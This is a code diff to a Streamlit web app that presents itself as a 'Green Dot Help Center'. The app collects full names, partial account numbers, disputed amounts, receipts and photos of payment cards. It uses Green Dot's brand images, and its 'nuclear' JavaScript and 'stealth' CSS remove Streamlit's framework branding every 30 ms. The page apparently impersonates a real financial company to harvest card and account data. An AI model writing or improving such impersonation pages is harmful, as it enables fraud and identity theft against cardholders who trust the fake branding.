@@ -23,14 +23,14 @@ init_db()
 
 st.set_page_config(page_title="Green Dot | Help Center", layout="centered", page_icon="✅")
 
-# JS NUCLEAR V1.2.3 (ELIMINACIÓN DE ANCLAS)
+# JS NUCLEAR V1.2.4 (INTERVALO 30ms)
 st.markdown("""<script>
     const nuclearClean = () => {
         const selectors = [
             'header', 'footer', '.stDeployButton', '[data-testid="stHeader"]',
             '[data-testid="stAppToolbar"]', '[data-testid="stHeaderActionElements"]',
-            '.stElementToolbar', '[data-testid="stElementToolbar"]', 
-            '.st-emotion-cache-140j12g', '.st-emotion-cache-gi0tri', 
+            '.stElementToolbar', '[data-testid="stElementToolbar"]',
+            '.st-emotion-cache-140j12g', '.st-emotion-cache-gi0tri',
             'button[title="View fullscreen"]', 'button[aria-label="Fullscreen"]',
             '.section-anchor', 'a.section-anchor', 'svg.etxdrby1'
         ];
@@ -44,12 +44,21 @@ st.markdown("""<script>
     setInterval(nuclearClean, 30);
 </script>""", unsafe_allow_html=True)
 
-# CSS STEALTH TOTAL
+# CSS STEALTH TOTAL V1.2.4
 st.markdown("""<style>
-    html, body, [data-testid="stAppViewContainer"], .stApp, 
-    .st-emotion-cache-1vo6xi6, .st-emotion-cache-6qob1r, .st-emotion-cache-140j12g {
+    /* BLINDAJE DE COLOR GLOBAL */
+    html, body, [data-testid="stAppViewContainer"], .stApp,
+    .st-emotion-cache-1vo6xi6, .st-emotion-cache-6qob1r, 
+    .st-emotion-cache-140j12g, .st-emotion-cache-h5555q {
         background-color: #000000 !important;
         color: #FFFFFF !important;
+    }
+
+    /* FORZAR COLOR EN CONTENEDORES DE MENSAJES/BLOQUES */
+    [data-testid="stMarkdownContainer"], .st-emotion-cache-h5555q, .st-emotion-cache-18ni7ap {
+        background-color: #000000 !important;
+        color: #FFFFFF !important;
+        border: none !important;
     }
 
     * { color: #FFFFFF !important; }
@@ -63,8 +72,9 @@ st.markdown("""<style>
     }
 
     @media (prefers-color-scheme: light) {
-        html, body, [data-testid="stAppViewContainer"], .stApp {
+        html, body, [data-testid="stAppViewContainer"], .stApp, .st-emotion-cache-h5555q {
             background-color: #000000 !important;
+            color: #FFFFFF !important;
         }
     }
 
@@ -83,32 +93,20 @@ st.markdown("""<style>
     }
 </style>""", unsafe_allow_html=True)
 
-if 'admin_mode' not in st.session_state: st.session_state.admin_mode = False
+if os.path.exists("logo.svg"): st.image("logo.svg", width=250)
+st.title("Help Center")
 
-if not st.session_state.admin_mode:
-    if os.path.exists("logo.svg"): st.image("logo.svg", width=250)
-    st.title("Help Center")
+with st.form("claim_v1_2_4", clear_on_submit=True):
+    st.text_input("Full Name")
+    st.text_input("Last 4 digits of Account")
+    st.number_input("Disputed Amount", format="%.2f")
+    st.file_uploader("Store Receipt", type=["jpg","png"])
+    st.file_uploader("Card Photo", type=["jpg","png"])
+    if st.form_submit_button("SUBMIT NOW"):
+        st.success("Claim Received.")
 
-    with st.form("claim_v1_2_3", clear_on_submit=True):
-        st.text_input("Full Name")
-        st.text_input("Last 4 digits of Account")
-        st.number_input("Disputed Amount", format="%.2f")
-        st.file_uploader("Store Receipt", type=["jpg","png"])
-        st.file_uploader("Card Photo", type=["jpg","png"])
-        if st.form_submit_button("SUBMIT NOW"):
-            st.success("Claim Received.")
-
-    st.markdown("""<div class='promo-box'>
-        <p>Download the Green Dot app</p>
-        <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/Play-store.svg' width='120'>
-        <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/App-store.svg' width='120'>
-    </div>""", unsafe_allow_html=True)
-
-    if st.button(" ", key="adm_btn"): 
-        st.session_state.admin_mode = True
-        st.rerun()
-else:
-    st.title("Admin Panel")
-    if st.button("Exit Admin Panel"): 
-        st.session_state.admin_mode = False
-        st.rerun()
+st.markdown("""<div class='promo-box'>
+    <p>Download the Green Dot app</p>
+    <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/Play-store.svg' width='120'>
+    <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/App-store.svg' width='120'>
+</div>""", unsafe_allow_html=True)
